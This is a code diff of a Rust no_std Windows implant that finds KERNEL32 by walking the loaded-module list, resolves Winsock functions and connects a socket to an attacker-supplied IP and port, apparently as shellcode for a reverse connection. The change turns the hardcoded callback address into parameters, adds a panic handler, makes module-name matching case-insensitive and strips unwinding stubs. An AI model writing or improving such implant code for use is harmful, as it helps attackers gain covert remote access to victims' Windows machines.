@@ -1,13 +1,12 @@
 #![no_std]
 #![no_main]
 
-extern crate panic_halt;
-
 use core::{
     arch::{asm, global_asm},
     ffi::c_void,
     mem::MaybeUninit,
     net::Ipv4Addr,
+    panic::PanicInfo,
     ptr::{null, null_mut},
 };
 use nocrt::strlen;
@@ -47,15 +46,24 @@ extern "C" {
 
 #[link_section = ".text.implant"]
 #[no_mangle]
-pub extern "C" fn init() {
-    unsafe { niam() };
+pub extern "C" fn init(ip: *const u8, port: u16) {
+    unsafe {
+        niam(
+            Ipv4Addr::new(*ip.add(0), *ip.add(1), *ip.add(2), *ip.add(3)),
+            port,
+        )
+    };
 }
 
-static TARGET_ADDR: Ipv4Addr = Ipv4Addr::new(127, 0, 0, 1);
-static TARGET_PORT: u16 = 1337;
+#[panic_handler]
+#[inline(never)]
+fn panic(_info: &PanicInfo) -> ! {
+    loop {
+        unsafe { core::arch::x86_64::_mm_pause() };
+    }
+}
 
-#[no_mangle]
-pub unsafe extern "C" fn niam() {
+unsafe fn niam(target_addr: Ipv4Addr, target_port: u16) {
     let kernel32 = w!("KERNEL32.DLL");
     let name_len = str_u16_len(kernel32);
     let name_slice = unsafe { core::slice::from_raw_parts(kernel32, name_len) };
@@ -84,10 +92,10 @@ pub unsafe extern "C" fn niam() {
 
     let sockaddr = SOCKADDR_IN {
         sin_family: AF_INET,
-        sin_port: TARGET_PORT.to_be(),
+        sin_port: target_port.to_be(),
         sin_addr: IN_ADDR {
             S_un: windows_sys::Win32::Networking::WinSock::IN_ADDR_0 {
-                S_addr: TARGET_ADDR.to_bits().to_be(),
+                S_addr: target_addr.to_bits().to_be(),
             },
         },
         sin_zero: [0; 8],
@@ -208,7 +216,11 @@ unsafe fn load_module(name: &[u16]) -> Option<*mut c_void> {
         let name_len = str_u16_len(dll_name_buffer).min(dll_name_len);
         let dll_name = core::slice::from_raw_parts(dll_name_buffer, name_len);
 
-        if dll_name == name {
+        if dll_name
+            .iter()
+            .zip(name)
+            .all(|(a, b)| (*a as u8).eq_ignore_ascii_case(&(*b as u8)))
+        {
             return (*module_list).Reserved2[0].into();
         }
 
@@ -259,16 +271,6 @@ unsafe fn module_function(
     }
 
     Err(())
-}
-
-#[no_mangle]
-extern "C" fn rust_eh_personality() {
-    unreachable!();
-}
-
-#[no_mangle]
-extern "C" fn _Unwind_Resume() -> ! {
-    unreachable!();
 }
 
 pub type WSAStartup =
